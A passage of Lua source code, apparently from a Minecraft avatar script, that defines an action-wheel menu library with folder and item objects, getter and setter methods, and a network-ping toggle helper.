                renderSlot(action_wheel["SLOT_"..slotid], {})
            end
            slotid = slotid + 1
            if slotid == 4 and requireMultiplePages then slotid = slotid + 2 end
            if slotid > 8 then slotid = 1 end
        end
    end

    function action_wheel_pages.createFolder(title, item)
        local ret = {
            type = "folder",
            contents = {},
            back = nil,

            title = title,
            item = item,
            hoverItem = nil,
            color = nil,
            hoverColor = nil
        }
        ret.add = function (element)
            if element.type == "folder" then
                element.back = ret
            end
            table.insert(ret.contents, element)
        end
        ret.remove = function (element)
            for k,v in pairs(ret.contents) do
                if v == element then
                    ret.contents[k] = nil
                end
            end
        end
        ret.setTitle = function (title)
            ret.title = title
        end
        ret.getTitle = function ()
            return ret.title
        end
        ret.setItem = function (item)
            ret.item = item
        end
        ret.getItem = function ()
            return ret.item
        end
        ret.setHoverItem = function (hoverItem)
            ret.hoverItem = hoverItem
        end
        ret.getHoverItem = function ()
            return ret.hoverItem
        end
        ret.setColor = function (color)
            ret.color = color
        end
        ret.getColor = function ()
            return ret.color
        end
        ret.setHoverColor = function (color)
            ret.hoverColor = color
        end
        ret.getHoverColor = function ()
            return ret.hoverColor
        end
        ret.clear = function ()
            ret = {
                type = "folder",
                contents = {},
                back = nil,
    
                title = nil,
                item = nil,
                hoverItem = nil,
                color = nil,
                hoverColor = nil
            }
        end
        ret.update = function ()
            update()
        end
        return ret
    end
    
    function action_wheel_pages.createItem(title, item)
        local ret = {
            type = "item",
            func = nil,

            title = title,
            item = item,
            hoverItem = nil,
            color = nil,
            hoverColor = nil
        }
        ret.setFunction = function (func)
            ret.func = func
        end
        ret.getFunction = function (func)
            ret.func = func
        end
        ret.setTitle = function (title)
            ret.title = title
        end
        ret.getTitle = function ()
            return ret.title
        end
        ret.setItem = function (item)
            ret.item = item
        end
        ret.getItem = function ()
            return ret.item
        end
        ret.setHoverItem = function (hoverItem)
            ret.hoverItem = hoverItem
        end
        ret.getHoverItem = function ()
            return ret.hoverItem
        end
        ret.setColor = function (color)
            ret.color = color
        end
        ret.getColor = function ()
            return ret.color
        end
        ret.setHoverColor = function (color)
            ret.hoverColor = color
        end
        ret.getHoverColor = function ()
            return ret.hoverColor
        end
        ret.clear = function ()
            ret = {
                type = "item",
                func = nil,
    
                title = nil,
                item = nil,
                hoverItem = nil,
                color = nil,
                hoverColor = nil
            }
        end
        ret.toggleVar = function (variable, on_text, on_icon, off_text, off_icon)
            local _toggle_ping_id = toggle_ping_id
            network.registerPing("action_wheel_toggleVar_ping_".._toggle_ping_id)
            ret.setFunction(function () network.ping("action_wheel_toggleVar_ping_".._toggle_ping_id, not _G[variable]) end)
            _G["action_wheel_toggleVar_ping_".._toggle_ping_id] = function(x)
                _G[variable] = x
                if _G[variable] then
                    ret.setTitle(off_text) 
                    ret.setItem(off_icon)
                else
                    ret.setTitle(on_text)
                    ret.setItem(on_icon)
                end
                update()
            end
            _G["action_wheel_toggleVar_ping_".._toggle_ping_id](_G[variable])
            toggle_ping_id = toggle_ping_id + 1
        end
        return ret
    end
    
    function action_wheel_pages.setLocation(folder)
        location = folder
        update()
    end
end

-- hi dad